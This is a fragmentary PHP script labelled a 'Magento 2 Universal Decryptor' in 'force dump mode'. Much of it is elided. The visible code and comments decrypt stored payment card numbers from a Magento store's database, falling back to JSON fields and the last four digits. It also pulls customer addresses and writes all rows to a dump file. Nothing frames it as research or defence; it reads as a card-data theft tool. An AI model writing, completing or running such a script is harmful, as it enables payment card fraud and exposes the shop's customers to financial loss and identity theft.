<?php
/**
 * Magento 2 Universal Decryptor - FORCE DUMP MODE
...
echo "Starting Force Dump Script...\n";
...
foreach ($rows as $r) {
    ...
    // Source 1: cc_number_enc column
    if (!empty($r['cc_number_enc'])) {
        $dec = smart_decrypt($r['cc_number_enc'], $keys);
        if ($dec && preg_match('/\d/', $dec)) $pan = $dec;
    }
    
    // Source 2: Additional Information JSON
    if ($pan === "N/A" && !empty($r['additional_information'])) {
    ...
    // Source 3: cc_last_4 (Better than nothing)
    ...
    // 3. Get Address (Lazy fetch to prevent join explosion/errors)
...
fclose($fp);
echo "DONE. Forced dump of " . count($rows) . " rows to $outFile\n";
?>
